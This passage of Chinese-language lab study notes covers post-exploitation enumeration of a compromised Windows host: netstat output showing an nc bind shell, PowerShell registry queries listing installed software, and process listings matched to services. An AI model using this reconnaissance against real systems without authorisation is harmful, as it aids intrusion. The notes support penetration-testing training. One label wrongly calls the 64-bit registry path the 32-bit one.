  TCP    192.168.187.220:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.187.220:3389    192.168.48.3:33770     ESTABLISHED     1148
  TCP    192.168.187.220:4444    192.168.48.3:58386     ESTABLISHED     2064
...
```
> `-a`：顯示所有連線與監聽 port (含 TCP 與 UDP)\
`-n`：使用數字格式顯示 IP 地址與端口 (不解析 DNS 或 hostname)\
`-o`：顯示對應的 PID，可用於對應 Task Manager 或 tasklist 來查詢哪個程序佔用端口
>>  80 和 443: Web Server\
>>  3306: MySQL Server\
>>  4444: 目前 nc 進來的 bind shell\
>>  3389: 看到來自 192.168.48.3 的 RDP 連線

#### - Get-ItemProperty 
檢查所有已安裝的應用程式
利用[兩個 registry keys](https://devblogs.microsoft.com/scripting/use-powershell-to-find-installed-software/) 列出 32-bit 和 64-bit 的應用程式
1. 查詢 32-bit (x86) 應用程式
>[!Important]
>`HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*`\
> 32-bit 應用程式存放的路徑 (Registry for 32-bit applications on Windows 64-bit systems)
```
PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

displayname                                                       
-----------                                                                                                       
FileZilla 3.63.1                                                  
KeePass Password Safe 2.51.1                                      
Microsoft Edge                                                    
Microsoft Edge Update                                             
Microsoft Edge WebView2 Runtime                                   
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913    
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913       
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
```
> `select displayname`: 顯示  application name\

![image](https://hackmd.io/_uploads/SyLl75-9Jg.png)

2. 查詢 64-bit (x64) 應用程式
>[!Important]
>`HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*`\
> 32-bit 應用程式存放的路徑 (Registry for 32-bit applications on Windows 64-bit systems)
> > 顯示方式：`DisplayName`, `Publisher`, `InstallLocation`, `DisplayVersion` 並用 `Format-Table` 呈現

```
PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, Publisher, InstallLocation, DisplayVersion | Format-Table -AutoSize
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, Publisher, InstallLocation, DisplayVersion | Format-Table -AutoSize

DisplayName                                                    Publisher             InstallLocation                   
-----------                                                    ---------             ---------------                   
7-Zip 21.07 (x64)                                              Igor Pavlov           C:\Program Files\7-Zip\           

XAMPP                                                          Bitnami               C:\xampp                          
VMware Tools                                                   VMware, Inc.          C:\Program Files\VMware\VMware ...
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913 Microsoft Corporation                                   
Microsoft Update Health Tools                                  Microsoft Corporation                                   
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913    Microsoft Corporation                                   
Update for Windows 10 for x64-based Systems (KB5001716)        Microsoft Corporation  
```
![image](https://hackmd.io/_uploads/H1vM79W91g.png)
可以透過 public exploits 利用應用程式的漏洞

3. 檢查 `C:\Program Files` 與 `C:\Users\{user}}\Downloads`

#### - Get-Process
檢查哪些 process 正在運行
```
PS C:\Users\dave> Get-Process
Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
     58      13      528       1088       0.00   2064   0 access                                                       
...                                                  
    369      32     9548      31320              2632   0 filezilla                                                    
...                                         
    188      29     9596      19716              3340   0 httpd                                                        
    486      49    16528      23060              4316   0 httpd                                                        
...                                                   
    205      17   210736      29228              3508   0 mysqld                                                       
...                                     
    982      32    83696      13780       0.59   2836   0 powershell                                                   
    587      28    65628      73752              9756   0 powershell                                                   
...
...
```
> bind shell: ID 2064\
> 當前執行的 PowerShell session: ID 9756
>> ID 3508 mysqld 能夠驗證先前猜測的 3306 port\
>> ID 4316 httpd 驗證先前猜測的 Apache 80/443

也可以推論 Apache 和 MySQL 都是透過 XAMPP 啟動的。

`PS C:\Users\dave> Get-Process | Select-Object ProcessName, Id, Path`
![image](https://hackmd.io/_uploads/rJP729Wcke.png)

### Hidden in Plain View
